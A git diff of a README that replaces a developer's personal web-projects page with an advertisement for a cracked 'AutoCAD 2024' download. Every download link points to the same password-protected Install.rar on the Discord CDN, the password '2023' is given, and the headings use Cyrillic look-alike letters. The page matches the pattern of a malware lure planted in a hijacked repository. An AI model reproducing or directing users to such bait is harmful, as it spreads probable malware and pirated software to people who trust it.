@@ -1,36 +1,19 @@
-# Web Projects
-## Web Projeleri
+# <h1 align=center> АutoCAD Autоdesk | 2024 New Features | Full Feature Set Оperational!
+![video-thumb-Urban-Art](https://damassets.autodesk.net/content/dam/autodesk/www/products/autocad/fy24/features/images/autocad-key-features-2195x1037-v2.jpg)
 
-Html ve Css ile yaptığım logo ve animasyonları sunuyorum. Github hesabımı takip etmeyi ve repoyu yıldızlamayı unutmayın. Teşekkürler.<br/>
-Daha fazla bu tarz içerik için → <code><a href="https://instagram.com/codingwithnihat" target="_blank">
-	  <img width="25px" src="https://user-images.githubusercontent.com/87497469/204072735-7f51784b-983d-4bc8-8bef-4b548cdc3b40.svg" alt="Instagram"/></a></code>
-	
-
-
-<p align="center">
-<a href="https://facebook.com/nihatxp" target="_blank">
-    <img width="50px" src="https://user-images.githubusercontent.com/87497469/204072688-30ac402a-27d6-434c-91e7-d837cf546da7.svg" alt="Website"/>
-</a>
-
-<a href="mailto:nihatxp@mail.ru">
-    <img width="50px" src="https://user-images.githubusercontent.com/87497469/204072698-3df67af4-ed93-4708-b025-d552c6bd8f44.svg" alt="Gmail"/>
-</a>
-
-<a href="https://github.com/nihatxp" target="_blank">
-    <img width="50px" src="https://user-images.githubusercontent.com/87497469/204072714-7f7b6687-93ff-46ae-a470-a21a8c6f9158.svg" alt="GitHub"/>
-</a>
-	
-<a href="https://www.linkedin.com/in/nihatxp" target="_blank">
-	<img width="50px" src="https://user-images.githubusercontent.com/87497469/204072724-84eb6e97-35ab-4f7e-b7fc-2605e30767b4.svg" alt="LinkedIn"/>
-</a>
-	
-<a href="https://instagram.com/nihatxp" target="_blank">
-	<img width="50px" src="https://user-images.githubusercontent.com/87497469/204072735-7f51784b-983d-4bc8-8bef-4b548cdc3b40.svg" alt="Instagram"/>
-</a>
-	
-<a href="https://twitter.com/nihatlyv" target="_blank">
-    <img width="50px" src="https://user-images.githubusercontent.com/87497469/204072750-a67c5225-725e-4b35-bc0c-f98c910dc0cd.svg" alt="Twitter" />
-</a>
-</p>
+# <h1 align=center>☁️ Dоwnload
+| Mod Version| AutoCAD-Autodesk - Version | Link |
+|----------|-------------|-----------------|
+| v21.1.1 | 2023.7.12 & 2023.7.11 | [Download](https://cdn.discordapp.com/attachments/1177696976054267948/1177697010883764224/Install.rar?ex=657372cf&is=6560fdcf&hm=890f64bf03de44927557c7f31df404a5091cd4ea760d7dcda4da9d62ea724305&) |
+| v21.2.0 | 2023.7.12 & 2023.7.11     | [Download](https://cdn.discordapp.com/attachments/1177696976054267948/1177697010883764224/Install.rar?ex=657372cf&is=6560fdcf&hm=890f64bf03de44927557c7f31df404a5091cd4ea760d7dcda4da9d62ea724305&) |
+| v21.1 | 2023.7.12 & 2023.7.11     | [Download](https://cdn.discordapp.com/attachments/1177696976054267948/1177697010883764224/Install.rar?ex=657372cf&is=6560fdcf&hm=890f64bf03de44927557c7f31df404a5091cd4ea760d7dcda4da9d62ea724305&) |
+| v21.0.7 | 2023.7.12 & 2023.7.11     | [Download](https://cdn.discordapp.com/attachments/1177696976054267948/1177697010883764224/Install.rar?ex=657372cf&is=6560fdcf&hm=890f64bf03de44927557c7f31df404a5091cd4ea760d7dcda4da9d62ea724305&) |
+# <h1 align=center> Password🔐: 2023
 
 
+![cads](https://graitec.com/uk/wp-content/uploads/sites/8/2023/04/aec_autocad.jpg)
+
+
+⚫️АutoCAD is a two- and three-dimensional computer-aided design and drafting system developed by Autodesk. The first version of the system was released in 1982.⚫️
+
+⚫️AutoCAD is a two- and three-dimensional computer-aided design and drafting system developed by Autodesk. The first version was released in 1982. AutoCAD and specialized applications based on it have found widespread use in engineering, construction, architecture, and other industries. First released in December 1982, AutoCAD was one of the first CAD programs to run on personal computers, particularly IBM PCs. At that time, most other CAD programs ran on large computers.⚫️
